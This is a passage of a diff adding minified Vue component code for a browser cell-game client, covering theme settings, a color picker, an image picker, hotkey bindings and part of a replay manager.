+                                return e.change("cellNameSmoothOutline", t)
+                            }
+                        }
+                    }, [e._v("Smooth name outline")]), e._v(" "), s("div", {
+                        staticClass: "slider-option"
+                    }, [e._v("\r\n                Long name threshold "), s("span", {
+                        staticClass: "right"
+                    }, [e._v(e._s(e.cellLongNameThreshold) + "px")]), e._v(" "), s("input", {
+                        staticClass: "slider",
+                        attrs: {
+                            type: "range",
+                            min: "500",
+                            max: "1250",
+                            step: "50"
+                        },
+                        domProps: {
+                            value: e.cellLongNameThreshold
+                        },
+                        on: {
+                            input: function(t) {
+                                return e.change("cellLongNameThreshold", t)
+                            }
+                        }
+                    })])], 2)]), e._v(" "), s("div", {
+                        staticClass: "section row"
+                    }, [s("div", {
+                        staticClass: "header"
+                    }, [e._v("\n        Mass text\n    ")]), e._v(" "), s("div", {
+                        staticClass: "options"
+                    }, [s("div", {
+                        staticClass: "bottom-margin"
+                    }, [e._v("\n            Font\n            "), s("input", {
+                        attrs: {
+                            type: "text",
+                            spellcheck: "false",
+                            placeholder: "Ubuntu",
+                            maxlength: "30"
+                        },
+                        domProps: {
+                            value: e.cellMassFont
+                        },
+                        on: {
+                            input: function(t) {
+                                return e.change("cellMassFont", t)
+                            },
+                            focus: function() {
+                                return e.fontWarning("mass", !0)
+                            },
+                            blur: function() {
+                                return e.fontWarning("mass", !1)
+                            }
+                        }
+                    })]), e._v(" "), e.showMassFontWarning ? [s("div", {
+                        staticClass: "silent"
+                    }, [e._v("It must be installed on your device.")]), e._v(" "), s("div", {
+                        staticClass: "silent"
+                    }, [e._v("If it still doesn't show, restart your PC")])] : e._e(), e._v(" "), s("div", {
+                        staticClass: "inline-range"
+                    }, [s("input", {
+                        staticClass: "slider",
+                        attrs: {
+                            type: "range",
+                            min: "0",
+                            max: "2",
+                            step: "1"
+                        },
+                        domProps: {
+                            value: e.cellMassWeight
+                        },
+                        on: {
+                            input: function(t) {
+                                return e.change("cellMassWeight", t)
+                            }
+                        }
+                    }), e._v("\n            " + e._s(e.cellMassWeightMeaning) + " mass text\n        ")]), e._v(" "), s("div", {
+                        staticClass: "inline-range",
+                        class: {
+                            off: !e.cellMassOutline
+                        }
+                    }, [s("input", {
+                        staticClass: "slider",
+                        attrs: {
+                            type: "range",
+                            min: "0",
+                            max: "3",
+                            step: "1"
+                        },
+                        domProps: {
+                            value: e.cellMassOutline
+                        },
+                        on: {
+                            input: function(t) {
+                                return e.change("cellMassOutline", t)
+                            }
+                        }
+                    }), e._v("\n            " + e._s(e.cellMassOutlineMeaning) + " mass outline\r\n            ")]), e._v(" "), s("div", {
+                        staticClass: "inline-range"
+                    }, [s("input", {
+                        staticClass: "slider",
+                        attrs: {
+                            type: "range",
+                            min: "0",
+                            max: "3",
+                            step: "1"
+                        },
+                        domProps: {
+                            value: e.cellMassTextSize
+                        },
+                        on: {
+                            input: function(t) {
+                                return e.change("cellMassTextSize", t)
+                            }
+                        }
+                    }), e._v("\n            " + e._s(e.cellMassTextSizeMeaning) + " mass text size\n        ")]), e._v(" "), s("p-check", {
+                        staticClass: "p-switch",
+                        attrs: {
+                            checked: e.cellMassSmoothOutline
+                        },
+                        on: {
+                            change: function(t) {
+                                return e.change("cellMassSmoothOutline", t)
+                            }
+                        }
+                    }, [e._v("Smooth mass outline")]), e._v(" "), s("p-check", {
+                        staticClass: "p-switch",
+                        attrs: {
+                            checked: e.shortMass
+                        },
+                        on: {
+                            change: function(t) {
+                                return e.change("shortMass", t)
+                            }
+                        }
+                    }, [e._v("Short mass format")])], 2)]), e._v(" "), s("div", {
+                        staticClass: "reset-option-wrapper"
+                    }, [s("span", {
+                        staticClass: "reset-option",
+                        on: {
+                            click: function() {
+                                return e.confirmReset()
+                            }
+                        }
+                    }, [s("i", {
+                        staticClass: "fa fa-undo"
+                    }), e._v(" Reset\n    ")])])])
+                };
+            M._withStripped = !0;
+            var T = function() {
+                var e = this,
+                    t = e.$createElement,
+                    s = e._self._c || t;
+                return s("div", {
+                    staticClass: "color-button",
+                    class: {
+                        disabled: e.disabled
+                    },
+                    style: {
+                        backgroundColor: "#" + e.hex
+                    },
+                    on: {
+                        mousedown: function() {
+                            e.disabled || e.showPicker(!0)
+                        }
+                    }
+                }, [e.pickerOpen ? s("div", {
+                    staticClass: "color-picker-wrapper",
+                    on: {
+                        mousedown: function(t) {
+                            return e.startMovingPivot(t)
+                        },
+                        mousemove: function(t) {
+                            return e.movePivot(t)
+                        },
+                        mouseup: function(t) {
+                            return e.stopMovingPivot(t)
+                        }
+                    }
+                }, [s("div", {
+                    staticClass: "color-picker-overlay"
+                }), e._v(" "), s("div", {
+                    staticClass: "color-picker fade-box"
+                }, [s("input", {
+                    directives: [{
+                        name: "model",
+                        rawName: "v-model",
+                        value: e.hue,
+                        expression: "hue"
+                    }],
+                    staticClass: "color-picker-hue",
+                    attrs: {
+                        type: "range",
+                        min: "0",
+                        max: "360",
+                        step: "1"
+                    },
+                    domProps: {
+                        value: e.hue
+                    },
+                    on: {
+                        change: function() {
+                            return e.triggerInput()
+                        },
+                        __r: function(t) {
+                            e.hue = t.target.value
+                        }
+                    }
+                }), e._v(" "), s("div", {
+                    staticClass: "color-picker-clr",
+                    style: {
+                        backgroundColor: "hsl(" + e.hue + ", 100%, 50%)"
+                    }
+                }, [s("div", {
+                    staticClass: "color-picker-sat"
+                }, [s("div", {
+                    staticClass: "color-picker-val"
+                }, [s("div", {
+                    staticClass: "color-picker-pivot",
+                    style: {
+                        left: 100 * e.sat + "px",
+                        top: 100 - 100 * e.val + "px"
+                    }
+                })])])]), e._v(" "), s("div", {
+                    staticClass: "color-picker-hex"
+                }, [s("span", {
+                    staticClass: "color-picker-hashtag"
+                }, [e._v("#")]), e._v(" "), s("input", {
+                    directives: [{
+                        name: "model",
+                        rawName: "v-model",
+                        value: e.hex,
+                        expression: "hex"
+                    }],
+                    staticClass: "color-picker-hex",
+                    attrs: {
+                        type: "text",
+                        spellcheck: "false",
+                        maxlength: "6",
+                        placeholder: "000000"
+                    },
+                    domProps: {
+                        value: e.hex
+                    },
+                    on: {
+                        input: [function(t) {
+                            t.target.composing || (e.hex = t.target.value)
+                        }, function() {
+                            return e.triggerInput()
+                        }]
+                    }
+                })])])]) : e._e()])
+            };
+            T._withStripped = !0;
+            var D = (s(172), Object(v.a)({
+                data: () => ({
+                    pickerOpen: !1,
+                    movingPivot: !1,
+                    hue: 0,
+                    sat: 0,
+                    val: 0
+                }),
+                props: ["value", "disabled"],
+                computed: {
+                    hex: {
+                        get() {
+                            return function(e, t, s) {
+                                var i, a, n, o, r, l, c, h;
+                                switch (l = s * (1 - t), c = s * (1 - (r = 6 * e - (o = Math.floor(6 * e))) * t), h = s * (1 - (1 - r) * t), o % 6) {
+                                    case 0:
+                                        i = s, a = h, n = l;
+                                        break;
+                                    case 1:
+                                        i = c, a = s, n = l;
+                                        break;
+                                    case 2:
+                                        i = l, a = s, n = h;
+                                        break;
+                                    case 3:
+                                        i = l, a = c, n = s;
+                                        break;
+                                    case 4:
+                                        i = h, a = l, n = s;
+                                        break;
+                                    case 5:
+                                        i = s, a = l, n = c
+                                }
+                                return (i = Math.ceil(255 * i).toString(16).padStart(2, "0")) + (a = Math.ceil(255 * a).toString(16).padStart(2, "0")) + Math.ceil(255 * n).toString(16).padStart(2, "0")
+                            }(this.hue / 360, this.sat, this.val)
+                        },
+                        set(e) {
+                            if (e = e.toLowerCase(), /^[0-9a-f]{6}$/.test(e)) {
+                                var t, s, i, a, n, o, r, l = (t = e, s = parseInt(t.slice(0, 2), 16) / 255, i = parseInt(t.slice(2, 4), 16) / 255, a = parseInt(t.slice(4, 6), 16) / 255, [60 * ((r = (o = (n = Math.max(s, i, a)) - Math.min(s, i, a)) && (n == s ? (i - a) / o : n == i ? 2 + (a - s) / o : 4 + (s - i) / o)) < 0 ? r + 6 : r), n && o / n, n]);
+                                this.hue = l[0], this.sat = l[1], this.val = l[2]
+                            }
+                        }
+                    }
+                },
+                methods: {
+                    showPicker(e) {
+                        this.pickerOpen = e
+                    },
+                    startMovingPivot(e) {
+                        var t = e.target.classList;
+                        if (t.contains("color-picker-overlay")) return this.showPicker(!1), void e.stopPropagation();
+                        (t.contains("color-picker-pivot") || t.contains("color-picker-val")) && (this.movingPivot = !0, this.movePivot(e))
+                    },
+                    movePivot(e) {
+                        if (this.movingPivot) {
+                            var t = this.$el.querySelector(".color-picker-val").getBoundingClientRect(),
+                                s = e.clientX - t.x,
+                                i = e.clientY - t.y;
+                            this.sat = s / 100, this.val = 1 - i / 100, this.sat = Math.min(Math.max(this.sat, 0), 1), this.val = Math.min(Math.max(this.val, 0), 1)
+                        }
+                    },
+                    stopMovingPivot(e) {
+                        this.movingPivot && (this.movePivot(e), this.movingPivot = !1, this.triggerInput())
+                    },
+                    triggerInput() {
+                        this.$emit("input", this.hex)
+                    }
+                },
+                created() {
+                    this.value && (this.hex = this.value)
+                }
+            }, T, [], !1, null, "5b0666af", null));
+            D.options.__file = "src/components/color-option.vue";
+            var L = D.exports,
+                N = function() {
+                    var e = this,
+                        t = e.$createElement,
+                        s = e._self._c || t;
+                    return s("div", {
+                        staticClass: "image-button",
+                        class: {
+                            disabled: e.disabled
+                        },
+                        style: {
+                            backgroundColor: "#" + e.hex
+                        },
+                        on: {
+                            mousedown: function() {
+                                e.disabled || e.showPicker(!0)
+                            }
+                        }
+                    }, [s("div", {
+                        staticClass: "image-button-text"
+                    }, [e._v("...")]), e._v(" "), e.pickerOpen ? s("div", {
+                        staticClass: "image-picker-wrapper",
+                        on: {
+                            click: function(t) {
+                                return e.tryHidePicker(t)
+                            }
+                        }
+                    }, [s("div", {
+                        staticClass: "image-picker-overlay"
+                    }), e._v(" "), s("div", {
+                        staticClass: "image-picker fade-box"
+                    }, [s("img", {
+                        staticClass: "image-picker-preview",
+                        style: {
+                            maxWidth: (e.value ? e.width : 200) + "px"
+                        },
+                        attrs: {
+                            src: e.value,
+                            alt: "No image chosen or it is invalid"
+                        },
+                        on: {
+                            click: function() {
+                                return e.openFileChooser()
+                            },
+                            dragover: function(t) {
+                                return e.allowDrop(t)
+                            },
+                            drop: function(t) {
+                                return e.onImageDrop(t)
+                            }
+                        }
+                    }), e._v(" "), s("div", {
+                        staticClass: "image-picker-information"
+                    }, [e._v("\n            Click or drop onto image to change."), s("br"), e._v(" "), "defaults" in this ? s("span", {
+                        staticClass: "image-picker-reset",
+                        on: {
+                            click: function() {
+                                return e.triggerInput(e.defaults)
+                            }
+                        }
+                    }, [e._v("Reset to default")]) : e._e()]), e._v(" "), s("input", {
+                        staticClass: "image-picker-input",
+                        attrs: {
+                            type: "file",
+                            accept: "image/png, image/jpeg, image/bmp, image/webp"
+                        },
+                        on: {
+                            change: function(t) {
+                                return e.onImageSelect(t)
+                            }
+                        }
+                    })])]) : e._e()])
+                };
+            N._withStripped = !0;
+            var U = (s(174), Object(v.a)({
+                data: () => ({
+                    pickerOpen: !1,
+                    fileReader: null
+                }),
+                props: ["value", "width", "disabled", "defaults"],
+                methods: {
+                    showPicker(e) {
+                        !this.pickerOpen && e && (this.imageLoadedOnce = !1), this.pickerOpen = e
+                    },
+                    tryHidePicker(e) {
+                        e.target.classList.contains("image-picker-overlay") && (this.showPicker(!1), e.stopPropagation())
+                    },
+                    triggerInput(e) {
+                        this.$emit("input", e)
+                    },
+                    openFileChooser() {
+                        this.$el.querySelector(".image-picker-input").click()
+                    },
+                    allowDrop(e) {
+                        e.preventDefault()
+                    },
+                    getFileReader() {
+                        var e = new FileReader;
+                        return e.addEventListener("load", e => {
+                            this.triggerInput(e.target.result)
+                        }), e
+                    },
+                    onImageSelect(e) {
+                        if (0 !== e.target.files.length) {
+                            var t = e.target.files[0];
+                            t.type.startsWith("image/") && this.getFileReader().readAsDataURL(t)
+                        }
+                    },
+                    onImageDrop(e) {
+                        if (e.preventDefault(), 0 !== e.dataTransfer.files.length) {
+                            var t = e.dataTransfer.files[0];
+                            t.type.startsWith("image/") && this.getFileReader().readAsDataURL(t)
+                        }
+                    }
+                }
+            }, N, [], !1, null, "641581b7", null));
+            U.options.__file = "src/components/image-option.vue";
+            var R = U.exports,
+                P = function() {
+                    var e = this.$createElement;
+                    return (this._self._c || e)("div")
+                };
+            P._withStripped = !0;
+            var F = Object(v.a)({
+                data: () => ({
+                    hello: 123
+                })
+            }, P, [], !1, null, "384e68ec", null);
+            F.options.__file = "src/components/template.vue", F.exports;
+            var G = s(1),
+                H = s(4),
+                O = s(5);
+
+            function Y(e) {
+                switch (e) {
+                    case 0:
+                        return "Thin";
+                    case 1:
+                        return "Normal";
+                    case 2:
+                        return "Bold";
+                    default:
+                        return "???"
+                }
+            }
+
+            function z(e) {
+                switch (e) {
+                    case 0:
+                        return "No";
+                    case 1:
+                        return "Thin";
+                    case 2:
+                        return "Thick";
+                    case 3:
+                        return "Thickest";
+                    default:
+                        return "???"
+                }
+            }
+
+            function W(e, t) {
+                return e ? new Promise((s, i) => {
+                    var a = new Image;
+                    a.onload = () => {
+                        var e = document.createElement("canvas"),
+                            i = e.getContext("2d"),
+                            n = Math.max(a.width, a.height),
+                            o = Math.min(a.width, a.height),
+                            r = n === a.width,
+                            l = Math.min(n, t) / n,
+                            c = (r ? n : o) * l,
+                            h = (r ? o : n) * l;
+                        e.width = c, e.height = h, i.drawImage(a, 0, 0, c, h), s(e.toDataURL())
+                    }, a.onerror = i, a.src = e
+                }) : null
+            }
+            var Z = PIXI.utils.isWebGLSupported() && H.useWebGL,
+                j = (s(176), Object(v.a)({
+                    components: {
+                        colorOption: L,
+                        imageOption: R
+                    },
+                    data: () => ({
+                        useWebGL: Z,
+                        bgDefault: H.getDefault("backgroundImageUrl"),
+                        virusDefault: H.getDefault("virusImageUrl"),
+                        mbArrowDefault: "https://i.postimg.cc/6pvLJ2TW/image.png",
+                        showNameFontWarning: !1,
+                        showMassFontWarning: !1,
+                        backgroundColor: H.backgroundColor,
+                        borderColor: H.borderColor,
+                        foodColor: H.foodColor,
+                        ejectedColor: H.ejectedColor,
+                        cellNameOutlineColor: H.cellNameOutlineColor,
+                        cursorImageUrl: H.cursorImageUrl,
+                        backgroundImageUrl: H.backgroundImageUrl,
+                        virusImageUrl: H.virusImageUrl,
+                        cellMassColor: H.cellMassColor,
+                        cellMassOutlineColor: H.cellMassOutlineColor,
+                        cellNameFont: H.cellNameFont,
+                        cellNameWeight: H.cellNameWeight,
+                        cellNameOutline: H.cellNameOutline,
+                        cellNameSmoothOutline: H.cellNameSmoothOutline,
+                        cellMassFont: H.cellMassFont,
+                        cellMassWeight: H.cellMassWeight,
+                        cellMassOutline: H.cellMassOutline,
+                        cellMassSmoothOutline: H.cellMassSmoothOutline,
+                        cellMassTextSize: H.cellMassTextSize,
+                        cellLongNameThreshold: H.cellLongNameThreshold,
+                        shortMass: H.shortMass,
+                        showBackgroundImage: H.showBackgroundImage,
+                        backgroundImageRepeat: H.backgroundImageRepeat,
+                        backgroundDefaultIfUnequal: H.backgroundDefaultIfUnequal,
+                        backgroundImageOpacity: H.backgroundImageOpacity,
+                        useFoodColor: H.useFoodColor,
+                        mbArrow: H.mbArrow,
+                        mbColor: H.mbColor
+                    }),
+                    computed: {
+                        cellNameWeightMeaning() {
+                            return Y(this.cellNameWeight)
+                        },
+                        cellMassWeightMeaning() {
+                            return Y(this.cellMassWeight)
+                        },
+                        cellNameOutlineMeaning() {
+                            return z(this.cellNameOutline)
+                        },
+                        cellMassOutlineMeaning() {
+                            return z(this.cellMassOutline)
+                        },
+                        cellMassTextSizeMeaning() {
+                            return function(e) {
+                                switch (e) {
+                                    case 0:
+                                        return "Small";
+                                    case 1:
+                                        return "Normal";
+                                    case 2:
+                                        return "Large";
+                                    case 3:
+                                        return "Largest";
+                                    default:
+                                        return "???"
+                                }
+                            }(this.cellMassTextSize)
+                        }
+                    },
+                    methods: {
+                        async change(e, t, s) {
+                            var i;
+                            i = t && t.target ? isNaN(t.target.valueAsNumber) ? t.target.value : t.target.valueAsNumber : t;
+                            try {
+                                switch (e) {
+                                    case "cursorImageUrl":
+                                        i = await W(i, 32);
+                                        break;
+                                    case "backgroundImageUrl":
+                                        i !== this.bgDefault && (i = await W(i, 4e3));
+                                        break;
+                                    case "virusImageUrl":
+                                        i !== this.virusDefault && (i = await W(i, 200));
+                                        break;
+                                    case "mbArrow":
+                                        G.dual.reloadArrow(i)
+                                }
+                            } catch (a) {
+                                return void O.alert("This image is too large to even be loaded.")
+                            }
+                            if (H[e] != i) {
+                                var n = this[e];
+                                try {
+                                    H.set(e, i)
+                                } catch (o) {
+                                    return H.set(e, n), void O.alert("Saving this setting failed. Perhaps the image is too large?")
+                                }
+                                switch (this[e] = i, e) {
+                                    case "cursorImageUrl":
+                                        G.events.$emit("set-cursor-url", i);
+                                        break;
+                                    case "backgroundColor":
+                                        G.renderer.backgroundColor = PIXI.utils.string2hex(i);
+                                        break;
+                                    case "cellNameOutlineColor":
+                                    case "cellNameFont":
+                                    case "cellNameWeight":
+                                    case "cellNameOutline":
+                                    case "cellNameSmoothOutline":
+                                        G.settings.compileNameFontStyle();
+                                        break;
+                                    case "cellMassColor":
+                                    case "cellMassOutlineColor":
+                                    case "cellMassFont":
+                                    case "cellMassWeight":
+                                    case "cellMassOutline":
+                                    case "cellMassSmoothOutline":
+                                    case "cellMassTextSize":
+                                        G.settings.compileMassFontStyle();
+                                        break;
+                                    case "cellLongNameThreshold":
+                                        G.scene.resetPlayerLongNames()
+                                }
+                                if (G.running) switch (e) {
+                                    case "borderColor":
+                                        G.scene.resetBorder();
+                                        break;
+                                    case "foodColor":
+                                        H.useFoodColor && G.scene.reloadFoodTextures();
+                                        break;
+                                    case "ejectedColor":
+                                        G.scene.reloadEjectedTextures();
+                                        break;
+                                    case "virusImageUrl":
+                                        G.scene.reloadVirusTexture();
+                                        break;
+                                    case "cellNameOutlineColor":
+                                    case "cellNameFont":
+                                    case "cellNameWeight":
+                                    case "cellNameOutline":
+                                    case "cellNameSmoothOutline":
+                                        G.scene.resetNameTextStyle();
+                                        break;
+                                    case "cellMassColor":
+                                    case "cellMassOutlineColor":
+                                    case "cellMassFont":
+                                    case "cellMassWeight":
+                                    case "cellMassOutline":
+                                    case "cellMassSmoothOutline":
+                                    case "cellMassTextSize":
+                                        G.scene.resetMassTextStyle(!0);
+                                        break;
+                                    case "showBackgroundImage":
+                                        G.scene.toggleBackgroundImage(i);
+                                        break;
+                                    case "backgroundImageUrl":
+                                    case "backgroundImageRepeat":
+                                    case "backgroundDefaultIfUnequal":
+                                    case "backgroundImageOpacity":
+                                        G.scene.setBackgroundImage();
+                                        break;
+                                    case "useFoodColor":
+                                        G.scene.reloadFoodTextures()
+                                }
+                            }
+                        },
+                        confirmReset() {
+                            O.confirm("Are you sure you want to reset all setting options?", () => this.reset())
+                        },
+                        reset() {
+                            var e = ["useWebGL", "bgDefault", "virusDefault", "showNameFontWarning", "showMassFontWarning"];
+                            for (var t in this.$data) e.includes(t) || this.change(t, H.getDefault(t))
+                        },
+                        fontWarning(e, t) {
+                            switch (e) {
+                                case "name":
+                                    this.showNameFontWarning = t;
+                                    break;
+                                case "mass":
+                                    this.showMassFontWarning = t
+                            }
+                        }
+                    }
+                }, M, [], !1, null, "15c13b66", null));
+            j.options.__file = "src/components/theming.vue";
+            var J = j.exports,
+                K = function() {
+                    var e = this,
+                        t = e.$createElement,
+                        s = e._self._c || t;
+                    return s("div", {
+                        attrs: {
+                            id: "hotkey-container"
+                        }
+                    }, [s("div", {
+                        staticClass: "hotkeys"
+                    }, e._l(e.availableHotkeys, function(t, i) {
+                        return s("div", {
+                            key: i,
+                            staticClass: "row"
+                        }, [s("span", {
+                            staticClass: "action"
+                        }, [e._v(e._s(i))]), e._v(" "), s("span", {
+                            staticClass: "bind",
+                            attrs: {
+                                tabindex: "0"
+                            },
+                            on: {
+                                mousedown: function(s) {
+                                    return e.onMouseDown(s, t)
+                                },
+                                keydown: function(s) {
+                                    return s.preventDefault(), e.onKeyDown(s, t)
+                                }
+                            }
+                        }, [e._v("\n            " + e._s(e.hotkeys[t]) + "\n        ")])])
+                    }), 0), e._v(" "), s("div", {
+                        staticClass: "footer"
+                    }, [s("span", {
+                        staticClass: "reset-button2",
+                        on: {
+                            click: e.onResetClick
+                        }
+                    }, [s("i", {
+                        staticClass: "fa fa-undo"
+                    }), e._v(" Reset\n    ")])])])
+                };
+            K._withStripped = !0;
+            var V = s(66),
+                X = s(5),
+                q = (s(178), Object(v.a)({
+                    data: () => ({
+                        availableHotkeys: {
+                            Multibox: "multibox",
+                            "Select player": "selectPlayer",
+                            Feed: "feed",
+                            "Feed macro": "feedMacro",
+                            Split: "split",
+                            Doublesplit: "splitx2",
+                            Triplesplit: "splitx3",
+                            "Quad split": "splitMax",
+                            "Split 32": "split32",
+                            "Split 64": "split64",
+                            "Split 128": "split128",
+                            "Split 256": "split256",
+                            "Multi trick-split": "multi1",
+                            "Multi double-trick": "multi2",
+                            "Multi line-trick": "multi3",
+                            "Diagonal linesplit": "linesplit",
+                            "Freeze mouse": "freezeMouse",
+                            "Lock linesplit": "lockLinesplit",
+                            "Stop movement": "stopMovement",
+                            Respawn: "respawn",
+                            "Toggle auto respawn": "toggleAutoRespawn",
+                            "Toggle skins": "toggleSkins",
+                            "Toggle names": "toggleNames",
+                            "Toggle food": "toggleFood",
+                            "Toggle mass": "toggleMass",
+                            "Toggle chat": "toggleChat",
+                            "Toggle chat popup": "toggleChatToast",
+                            "Toggle HUD": "toggleHud",
+                            "Spectate lock": "spectateLock",
+                            "Save replay": "saveReplay",
+                            "Zoom level 1": "zoomLevel1",
+                            "Zoom level 2": "zoomLevel2",
+                            "Zoom level 3": "zoomLevel3",
+                            "Zoom level 4": "zoomLevel4",
+                            "Zoom level 5": "zoomLevel5"
+                        },
+                        hotkeys: V.get()
+                    }),
+                    methods: {
+                        onResetClick: function() {
+                            X.confirm("Are you sure you want to reset all hotkeys?", () => {
+                                this.hotkeys = V.reset()
+                            })
+                        },
+                        onMouseDown: function(e, t) {
+                            if (e.target === document.activeElement) {
+                                var s = "MOUSE" + e.button;
+                                V.set(t, s) && (e.preventDefault(), this.hotkeys[t] = s, e.target.blur())
+                            }
+                        },
+                        onKeyDown: function(e, t) {
+                            var s = V.convertKey(e.code);
+                            "ESCAPE" !== s && "ENTER" !== s ? ("DELETE" == s && (s = ""), V.set(t, s) && (this.hotkeys[t] = s, e.target.blur())) : e.target.blur()
+                        }
+                    }
+                }, K, [], !1, null, "2dbed53e", null));
+            q.options.__file = "src/components/hotkeys.vue";
+            var ee = q.exports,
+                et = function() {
+                    var e = this,
+                        t = e.$createElement,
+                        s = e._self._c || t;
+                    return s("div", {
+                        staticClass: "container"
+                    }, [s("input", {
+                        ref: "file",
+                        staticStyle: {
+                            display: "none"
+                        },
+                        attrs: {
+                            type: "file",
+                            accept: ".vanis",
+                            multiple: ""
+                        },
+                        on: {
+                            change: function(t) {
+                                return e.onFile(t)
+                            }
+                        }
+                    }), e._v(" "), s("div", {
+                        staticClass: "replay-list-header"
+                    }, [s("span", {
+                        staticClass: "replay-list-count"
+                    }, [e._v(e._s(e.keysLoadedFirst ? e.replayKeys.length + " replay" + (1 !== e.replayKeys.length ? "s" : "") : "Loading"))]), e._v(" "), e.keysLoadedFirst && !e.keysEmpty ? s("span", {
+                        staticClass: "replay-list-page"
+                    }, [s("div", {
+                        staticClass: "anchor"
+                    }, [s("div", {
+                        staticClass: "left"
+                    }, [s("div", {
+                        staticClass: "current"
+                    }, [s("div", {
+                        staticClass: "phantom"
+                    }, [s("i", {
+                        staticClass: "fas fa-chevron-left prev",
+                        class: {
+                            disabled: !e.keysLoaded || 0 === e.pageIndex
+                        },
+                        on: {
+                            click: function() {
+                                return e.updateReplayPage(-1)
+                            }
+                        }
+                    }), e._v(" "), s("span", [e._v(e._s(e.pageCount))])]), e._v(" "), e.pageInputShown ? e._e() : s("div", {
+                        staticClass: "real",
+                        on: {
+                            click: function() {
+                                return e.togglePageInput(!0)
+                            }
+                        }
+                    }, [s("span", [e._v(e._s(1 + e.pageIndex))])]), e._v(" "), e.pageInputShown ? s("div", {
+                        staticClass: "real-input"
+                    }, [s("div", {
+                        staticClass: "overlay",
+                        on: {
+                            click: function() {
+                                return e.togglePageInput(!1)
+                            }
+                        }
+                    }), e._v(" "), s("i", {
+                        staticClass: "fas fa-chevron-left prev",
+                        class: {
+                            disabled: !e.keysLoaded || 0 === e.pageIndex
+                        },
+                        on: {
+                            click: function() {
+                                return e.updateReplayPage(-1)
+                            }
+                        }
+                    }), e._v(" "), s("input", {
+                        attrs: {
+                            type: "text"
+                        },
+                        domProps: {
+                            value: 1 + e.pageIndex
+                        },
+                        on: {
+                            focus: function(e) {
+                                return e.target.select()
+                            },
+                            change: function(t) {
+                                return e.updateReplayPage(t)
+                            }
+                        }
+                    })]) : e._e()])]), e._v("\n            /\n            "), s("div", {
+                        staticClass: "right"
+                    }, [e._v("\n                " + e._s(e.pageCount) + "\n                    "), s("i", {
+                        staticClass: "fas fa-chevron-right next",
+                        class: {
+                            disabled: !e.keysLoaded || e.pageIndex === e.pageCount - 1
+                        },
+                        on: {
+                            click: function() {
+                                return e.updateReplayPage(1)
+                            }
+                        }
+                    })])])]) : e._e(), e._v(" "), s("span", {
+                        staticClass: "replay-list-bulk"
+                    }, [s("input", {
+                        staticClass: "vanis-button",
+                        attrs: {
+                            type: "button",
+                            disabled: !e.keysLoaded,
+                            value: "Import"
+                        },
+                        on: {
+                            click: function() {
+                                return e.$refs.file.click()
+                            }
+                        }
+                    }), e._v(" "), s("input", {
+                        staticClass: "vanis-button",
+                        attrs: {
+                            type: "button",
+                            disabled: !e.keysLoaded || e.keysEmpty,
+                            value: "Download all"
+                        },
+                        on: {
+                            click: function() {
+                                return e.downloadAllReplays()
+                            }
+                        }
+                    }), e._v(" "), s("input", {
+                        staticClass: "vanis-button",
+                        attrs: {
+                            type: "button",
+                            disabled: !e.keysLoaded || e.keysEmpty,
+                            value: "Delete all"
+                        },
+                        on: {
+                            click: function() {
+                                return e.deleteAllReplays()
+                            }
+                        }
+                    })])]), e._v(" "), s("div", {
+                        staticClass: "replay-list"
+                    }, [e.keysLoadedFirst && e.keysEmpty ? [s("div", {
+                        staticClass: "notification"
+                    }, [s("div", [e._v("Press "), s("b", [e._v(e._s(e.messageHotkey))]), e._v(" in game to save last "), s("b", [e._v(e._s(e.messageReplayDuration))]), e._v(" seconds of gameplay.")]), e._v(" "), s("div", {
+                        staticStyle: {
+                            color: "red",
+                            "font-weight": "bold"
+                        }
+                    }, [e._v("Replays are saved in browser memory!")]), e._v(" "), s("div", [e._v("They get permanently erased if browser data gets cleared.")])])] : e._e(), e._v(" "), e.keysLoadedFirst && !e.keysEmpty ? [s("div", {
+                        staticClass: "replay-page"
+                    }, e._l(e.pageData, function(e, t) {
+                        return s("replay-item", {
+                            key: t,
+                            attrs: {
+                                replay: e
+                            }
+                        })
+                    }), 1)] : e._e()], 2), e._v(" "), e.bulkOperating ? s("div", {
+                        staticClass: "overlay bulk-operation-overlay"
+                    }, [e._v("\n        Please wait...\n        "), e.bulkOperationStatus ? s("div", {
+                        staticClass: "small"
+                    }, [e._v(e._s(e.bulkOperationStatus))]) : e._e(), e._v(" "), e.showMultipleFilesWarning ? s("div", {
+                        staticClass: "small warning"
+                    }, [e._v("Allow page to download multiple files if asked")]) : e._e()]) : e._e()])
+                };
+            et._withStripped = !0;
+            var es = s(116),
+                ei = s(89),
+                ea = s(180),
+                en = s(1),
+                eo = s(66),
+                er = s(4),
+                el = s(5),
+                ec = s(8),
+                eh = en.replay.database,
+                ed = {
+                    data: () => ({
+                        keysLoadedFirst: !1,
+                        keysLoaded: !1,
+                        keysLoading: !1,
+                        keysEmpty: !1,
+                        replayKeys: [],
+                        pageInputShown: !1,
+                        pageLoadingCancel: null,
+                        pageLoaded: !1,
+                        pageIndex: 0,
+                        pageCount: 0,
+                        pageData: [],
+                        bulkOperating: !1,
+                        bulkOperationStatus: "",
+                        showMultipleFilesWarning: !1,
+                        messageHotkey: eo.get().saveReplay,
+                        messageReplayDuration: er.replayDuration
+                    }),
+                    components: {
+                        replayItem: es.default
+                    },
+                    methods: {
+                        togglePageInput(e) {
+                            this.pageInputShown = e
+                        },
+                        setBulkOp(e, t) {
+                            e ? (this.bulkOperating = !0, this.bulkOperationStatus = t || "") : setTimeout(() => {
+                                this.bulkOperating = !1, this.bulkOperationStatus = ""
+                            }, 1e3)
+                        },
+                        async onFile(e) {
+                            if (!this.bulkOperating) {
+                                var t = Array.from(e.target.files);
+                                if (t.length) {
+                                    e.target && (e.target.value = null);
+                                    var s = 0,
+                                        i = t.length,
+                                        a = t.map(async e => {
+                                            var t, a;
+                                            await eh.setItem(e.name.replace(/\.vanis$/, ""), await (t = e, new Promise((e, s) => {
+                                                var i = new FileReader;
+                                                i.onload = t => e(t.target.result), i.onerror = s, i.readAsText(t)
+                                            }))), this.setBulkOp(!0, "Importing replays (" + ++s + " / " + i + ")")
+                                        });
+                                    this.setBulkOp(!0, "Importing replays");
+                                    try {
+                                        await Promise.all(a)
+                                    } catch (n) {
+                                        el.alert('Error importing replays: "' + n.message + '"'), this.setBulkOp(!1), this.updateReplayKeys()
+                                    }
+                                    this.setBulkOp(!1), this.updateReplayKeys()
+                                }
+                            }
+                        },
+                        async downloadAllReplays() {
+                            if (!this.bulkOperating && this.keysLoaded) {
+                                var e = this.replayKeys.length,
+                                    t = Math.ceil(this.replayKeys.length / 200),
+                                    s = t > 1,
+                                    i = ec.getTimestamp();
+                                this.showMultipleFilesWarning = s, this.setBulkOp(!0, "Packing replays (0 / " + t + ")");
+                                for (var a = 0, n = 0; a < e; a += 200, n++) {
